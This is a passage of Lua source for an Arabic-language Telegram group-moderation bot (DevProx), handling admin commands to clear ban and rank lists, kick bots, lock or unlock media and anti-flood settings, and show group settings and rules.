local f = '☬︙*عدد ٱڵبوتٱت ٱڵمرفوعه* ↫ ❪'..t..'❫\n☬︙*ملٱحضه علٱمة الـ ❪ ✯ ❫ تعني ٱن ٱڵبوت ٱدمن في هذه ٱڵمجموعه*'
Dev_Abs(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end
getChannelMembers(msg.chat_id_, 0, 'Bots', 200,cb)
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^حذف (.*)$") and Abbas_Abs(msg) or text and text:match("^مسح (.*)$") and Abbas_Abs(msg) or text and text:match("^طرد (.*)$") and Abbas_Abs(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
local kicbot = {string.match(text, "^(طرد) (.*)$")}
if is_sudo(msg) then 
if txts[2] == 'قائمه العام' or txtss[2] == 'قائمه العام' then
DevAbs:del(DevProx..'bot:gban:')
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف قٱئمة ٱڵعٱم \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
if is_leader(msg) then 
if txts[2] == 'المطورين' or txtss[2] == 'المطورين' then
DevAbs:del(DevProx..'abs:sudo3:')
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمطورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
if txts[2] == 'البوتات' or txtss[2] == 'البوتات' or kicbot[2] == 'البوتات' then
local botslist = function(extra, result)
local list = result.members_
for i = 0, #list do
if tonumber(list[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,list[i].user_id_)
end 
end
end
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵبوتٱت \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
getChannelMembers(msg.chat_id_, 0, "Bots", 100, botslist)
end
if is_monsh(msg.sender_user_id_, msg.chat_id_) then
if txts[2] == 'المنشئين' or txtss[2] == 'المنشئين' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمنشئين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:monshid:'..msg.chat_id_)
end end
if txts[2] == 'الادمنيه' or txtss[2] == 'الادمنيه' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱلٱدمنية \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:admins:'..msg.chat_id_)
end
if txts[2] == 'المطايه' or txtss[2] == 'المطايه' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمطٱية \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:donky:'..msg.chat_id_)
end
if txts[2] == 'المميزين' or txtss[2] == 'المميزين' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمميزين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:vipmem:'..msg.chat_id_)
end
if txts[2] == 'قائمه المنع' or txtss[2] == 'قائمه المنع' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف قٱئمة ٱڵمنع \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:filters:'..msg.chat_id_)
end
if txts[2] == 'المكتومين' or txtss[2] == 'المكتومين' then
DevAbs:del(DevProx..'bot:muted:'..msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمكتومين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
end
if text == 'حذف الرابط' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or text == 'مسح الرابط' and is_admin(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
DevAbs:del(DevProx.."bot:group:link"..msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف رٱبط ٱڵمجموعة \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
if is_sudo3(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^حذف (.*)$") and Abbas_Abs(msg) or text and text:match("^مسح (.*)$") and Abbas_Abs(msg) then
local txts = {string.match(text, "^(حذف) (.*)$")}
local txtss = {string.match(text, "^(مسح) (.*)$")}
if txts[2] == 'قائمه المنع العام'or txtss[2] == 'قائمه المنع العام' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف قٱئمة ٱڵمنع ٱڵعٱم \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:freewords:')
end
if txtss[2] == 'المدراء' or txts[2] == 'المدراء' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمدرٱء \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:owners:'..msg.chat_id_)
end
if txtss[2] == 'المنشئين الاساسيين' or txts[2] == 'المنشئين الاساسيين' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمنشئين ٱلٱسٱسيين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:monsh:'..msg.chat_id_)
end
if txts[2] == 'الادمنيه العامين' or txtss[2] == 'الادمنيه العام' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱلٱدمنية ٱڵعٱمين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:adminall:')
end
if txts[2] == 'المميزين عام' or txtss[2] == 'المميزين العامين' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمميزين عٱم \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:vipall:')
end
if txts[2] == 'المدراء العامين' or txtss[2] == 'المدراء العام' then
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵمدرٱء ٱڵعٱمين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'abs:ownerall:')
end
end
end
--     Source DevProx     --
if text and text:match("^حذف القوائم$") and Abbas_Abs(msg) or text and text:match("^مسح القوائم$") and Abbas_Abs(msg) then
if not is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمنشئ ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:del(DevProx..'bot:banned:'..msg.chat_id_)
DevAbs:del(DevProx..'abs:admins:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:donky:'..msg.chat_id_)
DevAbs:del(DevProx..'abs:vipmem:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:filters:'..msg.chat_id_)
DevAbs:del(DevProx..'bot:muted:'..msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حذف ↫ ❨ قٱئمة ٱڵمنع • ٱڵمحظورين • ٱڵمكتومين • ٱلٱدمنية • ٱڵمميزين • ٱڵمطٱية ❩ بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end end
if text and text:match("^قفل التفليش$") then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمنشئ ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:set(DevProx..'bot:links:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:forward:mute'..msg.chat_id_,true) DevAbs:del(DevProx..'lock:get:photo'..msg.chat_id_) DevAbs:set(DevProx..'bot:bots:ban'..msg.chat_id_,true) DevAbs:set(DevProx..'anti-flood:'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:video:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:gifs:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:sticker:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'farsiban'..msg.chat_id_,true) DevAbs:del(DevProx.."fshar"..msg.chat_id_) DevAbs:del(DevProx.."taf"..msg.chat_id_) DevAbs:del(DevProx.."kaf"..msg.chat_id_) DevAbs:set(DevProx..'floodstatus'..msg.chat_id_,'Kicked') DevAbs:set('DevProx:id:photo'..msg.chat_id_,true)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم قفـڵ ٱڵتفڵيش بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح التفليش$") then
if not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمنشئ ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:del(DevProx..'bot:links:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:forward:mute'..msg.chat_id_) DevAbs:set(DevProx..'lock:get:photo'..msg.chat_id_,true) DevAbs:del(DevProx..'bot:bots:ban'..msg.chat_id_) DevAbs:del(DevProx..'anti-flood:'..msg.chat_id_) DevAbs:del(DevProx..'bot:video:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:gifs:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:sticker:mute'..msg.chat_id_) DevAbs:del(DevProx..'farsiban'..msg.chat_id_) DevAbs:set(DevProx..'fshar'..msg.chat_id_,true) DevAbs:set(DevProx..'taf'..msg.chat_id_,true) DevAbs:set(DevProx..'kaf'..msg.chat_id_,true)
DevAbs:del('DevProx:id:photo'..msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم فـتـۧح ٱڵتفڵيش بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
if text and text:match("^قفل الكل$") then
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمشرفين فقط ', 1, 'md')
else
DevAbs:set(DevProx..'editmsg'..msg.chat_id_,true) DevAbs:set(DevProx..'farsi'..msg.chat_id_,true) DevAbs:del(DevProx..'fshar'..msg.chat_id_) DevAbs:del(DevProx..'taf'..msg.chat_id_) DevAbs:del(DevProx..'kaf'..msg.chat_id_) DevAbs:set(DevProx..'farsiban'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:cmds'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:bots:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:bots:ban'..msg.chat_id_,true) DevAbs:set(DevProx..'anti-flood:'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:text:mute'..msg.chat_id_,true) 
DevAbs:set(DevProx..'bot:inline:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:photo:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:spam:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:video:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:gifs:mute'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:music:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:voice:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:links:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:location:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'tags:lock'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:strict'..msg.chat_id_,true)
DevAbs:set(DevProx..'bot:arabic:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:english:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:sticker:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'markdown:lock'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:forward:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'floodstatus'..msg.chat_id_,'Kicked')
DevAbs:set(DevProx..'bot:document:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:contact:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:abstag:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:webpage:mute'..msg.chat_id_,true) DevAbs:set(DevProx..'bot:tgservice:jk'..msg.chat_id_,true)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم قفـڵ ٱڵكل بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
if text and text:match("^فتح الكل$") then
if not is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمشرفين فقط ', 1, 'md')
else
DevAbs:del(DevProx..'editmsg'..msg.chat_id_) DevAbs:del(DevProx..'farsi'..msg.chat_id_) DevAbs:set(DevProx..'fshar'..msg.chat_id_,true) DevAbs:set(DevProx..'taf'..msg.chat_id_,true) DevAbs:set(DevProx..'kaf'..msg.chat_id_,true) DevAbs:del(DevProx..'farsiban'..msg.chat_id_)
DevAbs:del(DevProx..'bot:cmds'..msg.chat_id_) DevAbs:del(DevProx..'bot:bots:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:bots:ban'..msg.chat_id_) DevAbs:del(DevProx..'keed_bots'..msg.chat_id_) DevAbs:del(DevProx..'anti-flood:'..msg.chat_id_) DevAbs:del(DevProx..'bot:tgservice:jk'..msg.chat_id_)
DevAbs:del(DevProx..'bot:text:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:photo:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:spam:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:video:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:sticker:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:document:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:inline:mute'..msg.chat_id_) DevAbs:del(DevProx..'markdown:lock'..msg.chat_id_) DevAbs:del(DevProx..'bot:gifs:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:music:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:voice:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:links:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:location:mute'..msg.chat_id_) DevAbs:del(DevProx..'tags:lock'..msg.chat_id_) DevAbs:del(DevProx..'bot:strict'..msg.chat_id_) DevAbs:del(DevProx..'bot:forward:mute'..msg.chat_id_)
DevAbs:del(DevProx..'bot:abstag:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:contact:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:webpage:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:arabic:mute'..msg.chat_id_) DevAbs:del(DevProx..'bot:english:mute'..msg.chat_id_)
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم فـتـۧح ٱڵكل بنجٱح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then 
if text and text:match("^[Ss]ettings$") or text and text:match("^الاعدادات$") and Abbas_Abs(msg) then
if DevAbs:get(DevProx..'bot:muteall'..msg.chat_id_) then mute_all = 'مقفڵه' else mute_all = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:text:mute'..msg.chat_id_) then mute_text = 'مقفڵه' else mute_text = 'مفتوحه'end
if DevAbs:get(DevProx..'bot:photo:mute'..msg.chat_id_) then mute_photo = 'مقفڵه' else mute_photo = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:video:mute'..msg.chat_id_) then mute_video = 'مقفڵه' else mute_video = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:gifs:mute'..msg.chat_id_) then mute_gifs = 'مقفڵه' else mute_gifs = 'مفتوحه' end
if DevAbs:get(DevProx..'anti-flood:'..msg.chat_id_) then mute_flood = 'مقفڵه' else mute_flood = 'مفتوحه' end
--     Source DevProx     --
if not DevAbs:get(DevProx..'flood:max:'..msg.chat_id_) then
flood_m = 5
else
flood_m = DevAbs:get(DevProx..'flood:max:'..msg.chat_id_)
end
if not DevAbs:get(DevProx..'bot:sens:spam'..msg.chat_id_) then
spam_c = 250
else
spam_c = DevAbs:get(DevProx..'bot:sens:spam'..msg.chat_id_)
end
--     Source DevProx     --
if DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "DelMsg" then
floodstatus = "بٱڵحذف"
elseif DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) == "Kicked" then
floodstatus = "بٱڵطرد"
elseif not DevAbs:get(DevProx..'floodstatus'..msg.chat_id_) then
floodstatus = "بٱڵحذف"
end
--     Source DevProx     --
if DevAbs:get(DevProx..'bot:music:mute'..msg.chat_id_) then mute_music = 'مقفڵه' else mute_music = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:bots:mute'..msg.chat_id_) then mute_bots = 'مقفڵه' else mute_bots = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:inline:mute'..msg.chat_id_) then mute_in = 'مقفڵه' else mute_in = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) then mute_cmd = 'مقفڵه' else mute_cmd = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:voice:mute'..msg.chat_id_) then mute_voice = 'مقفڵه' else mute_voice = 'مفتوحه' end
if DevAbs:get(DevProx..'editmsg'..msg.chat_id_) then mute_edit = 'مقفڵه' else mute_edit = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then mute_links = 'مقفڵه' else mute_links = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:pin:mute'..msg.chat_id_) then lock_pin = 'مقفڵه' else lock_pin = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:sticker:mute'..msg.chat_id_) then lock_sticker = 'مقفڵه' else lock_sticker = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:tgservice:jk'..msg.chat_id_) then lock_tgservice = 'مقفڵه' else lock_tgservice = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:webpage:mute'..msg.chat_id_) then lock_wp = 'مقفڵه' else lock_wp = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:strict'..msg.chat_id_) then strict = 'مقفڵه' else strict = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:abstag:mute'..msg.chat_id_) then lock_htag = 'مقفڵه' else lock_htag = 'مفتوحه' end
if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then lock_tag = 'مقفڵه' else lock_tag = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:location:mute'..msg.chat_id_) then lock_location = 'مقفڵه' else lock_location = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:contact:mute'..msg.chat_id_) then lock_contact = 'مقفڵه' else lock_contact = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:english:mute'..msg.chat_id_) then lock_english = 'مقفڵه' else lock_english = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:arabic:mute'..msg.chat_id_) then lock_arabic = 'مقفڵه' else lock_arabic = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:forward:mute'..msg.chat_id_) then lock_forward = 'مقفڵه' else lock_forward = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:document:mute'..msg.chat_id_) then lock_file = 'مقفڵه' else lock_file = 'مفتوحه' end
if DevAbs:get(DevProx..'markdown:lock'..msg.chat_id_) then markdown = 'مقفڵه' else markdown = 'مفتوحه' end
if DevAbs:get(DevProx..'bot:spam:mute'..msg.chat_id_) then lock_spam = 'مقفڵه' else lock_spam = 'مفتوحه' end
if DevAbs:get(DevProx.."bot:welcome"..msg.chat_id_) then send_welcome = 'مقفڵه' else send_welcome = 'مفتوحه' end
if DevAbs:get(DevProx..'fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفڵ' end
if DevAbs:get(DevProx..'kaf'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفڵ' end
if DevAbs:get(DevProx..'taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفڵه' end
--     Source DevProx     --
local TXTE = "☬︙اعدادات المجموعة ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
.."☬︙ٱڵروٱبط ↫ "..mute_links.."\n"
.."☬︙ٱڵمعرف ↫ "..lock_tag.."\n"
.."☬︙ٱڵبوتٱت ↫ "..mute_bots.."\n"
.."☬︙ٱڵشٱرحه ↫ "..mute_cmd.."\n"
.."☬︙ٱڵمتحركه ↫ "..mute_gifs.."\n"
.."☬︙ٱڵمڵصقٱت ↫ "..lock_sticker.."\n"
.."☬︙ٱڵمڵفٱت ↫ "..lock_file.."\n"
.."☬︙ٱڵصور ↫ "..mute_photo.."\n"
.."☬︙ٱڵفيديو ↫ "..mute_video.."\n"
.."☬︙ٱلٱونلٱين ↫ "..mute_in.."\n"
.."☬︙ٱڵدردشه ↫ "..mute_text.."\n"
.."☬︙ٱڵتوجيه ↫ "..lock_forward.."\n"
.."☬︙ٱلٱغٱني ↫ "..mute_music.."\n"
.."☬︙ٱڵصوت ↫ "..mute_voice.."\n"
.."☬︙ٱڵجهات ↫ "..lock_contact.."\n"
.."☬︙ٱڵمٱركدٱون ↫ "..markdown.."\n"
.."☬︙ٱڵحمٱيه ↫ "..strict.."\n"
.."☬︙ٱڵهٱشتٱك ↫ "..lock_htag.."\n"
.."☬︙ٱڵتعديل ↫ "..mute_edit.."\n"
.."☬︙ٱڵتثبيت ↫ "..lock_pin.."\n"
.."☬︙ٱلٱشعٱرٱت ↫ "..lock_tgservice.."\n"
.."☬︙ٱڵكلٱيش ↫ "..lock_spam.."\n"
.."☬︙ٱڵشبكٱت ↫ "..lock_wp.."\n"
.."☬︙ٱڵموٱقع ↫ "..lock_location.."\n"
.."☬︙ٱڵفشٱر ↫ "..lock_fshar.."\n"
.."☬︙ٱڵكفر ↫ "..lock_kaf.."\n"
.."☬︙ٱڵطٱئفيه ↫ "..lock_taf.."\n"
.."☬︙ٱڵعربيه ↫ "..lock_arabic.."\n"
.."☬︙ٱلٱنكڵيزيه ↫ "..lock_english.."\n"
.."☬︙ٱڵكل↫ "..mute_all.."\n"
.."☬︙ٱڵتكرٱر ↫ "..mute_flood.."\n"
.."☬︙خٱصية ٱڵتكرٱر ↫ "..floodstatus.."\n"
.."☬︙عدد ٱڵتكرٱر ↫ [ "..flood_m.." ]\n"
.."☬︙عدد ٱڵسبٱم ↫ [ "..spam_c.." ]\n"
.."┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)\n"
Dev_Abs(msg.chat_id_, msg.id_, 1, TXTE, 1, 'md')
end
end
--     Source DevProx     --
if text and text:match("^كول (.*)$") and Abbas_Abs(msg) then
local txt = {string.match(text, "^(كول) (.*)$")}
Dev_Abs(msg.chat_id_,0, 1, txt[2], 1, 'md')
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)
end
--     Source DevProx     --
if is_owner(msg.sender_user_id_, msg.chat_id_) then
if (text and text == 'تفعيل ردود البوت') and Abbas_Abs(msg) or (text and text == 'تفعيل الردود') and Abbas_Abs(msg) or (text and text == 'تفعيل ردود المطور') and Abbas_Abs(msg) then
if not DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙رډوډ ٱڵمطور ،بٱڵتاكيد ،مۧفعڵـة ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـفعيـۧڵ رډوډ ٱڵمطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:del(DevProx..'bot:rep:mute'..msg.chat_id_)
end end
if (text and text == 'تعطيل ردود البوت') and Abbas_Abs(msg) or (text and text == 'تعطيل الردود') and Abbas_Abs(msg) or (text and text == 'تعطيل ردود المطور') and Abbas_Abs(msg) then
if DevAbs:get(DevProx..'bot:rep:mute'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙رډوډ ٱڵمطور ،بٱڵتاكيد ،مۧعطڵـة ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم تـعطيـۧڵ رډوډ ٱڵمطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set(DevProx..'bot:rep:mute'..msg.chat_id_,true)
end end
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع قوانين (.*)$") and Abbas_Abs(msg) then
local txt = {string.match(text, "^(ضع قوانين) (.*)$")}
DevAbs:set(DevProx..'bot:rules'..msg.chat_id_, txt[2])
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم وضع قوٱنين ٱڵمجموعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end end
if text and text:match("^[Rr]ules$") or text and text:match("^القوانين$") then
local rules = DevAbs:get(DevProx..'bot:rules'..msg.chat_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, rules, 1, nil)
end
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الروابط$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:links:mute'..msg.chat_id_) then mute_links = 'مقفڵه' else mute_links = 'مفتوحه' end local ABS_PROX = "\n" .."☬︙ٱڵروٱبط ↫ "..mute_links.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^المعرف$") or text and text:match("^المعرفات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'tags:lock'..msg.chat_id_) then lock_tag = 'مـقفۄڵة' else lock_tag = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵمعرف ↫ "..lock_tag.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^البوتات$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:bots:ban'..msg.chat_id_) then mute_bots = 'مـقفۄڵة' else mute_bots = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵبوتٱت ↫ "..mute_bots.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
if is_admin(msg.sender_user_id_, msg.chat_id_) then if text and text:match("^الشارحه$") then if not DevAbs:get(DevProx..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(DevProx..'bot:cmds'..msg.chat_id_) then mute_cmd = 'مـقفۄڵة' else mute_cmd = 'مفتوحة' end local ABS_PROX = "\n" .."☬︙ٱڵشٱرحه ↫ "..mute_cmd.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end end
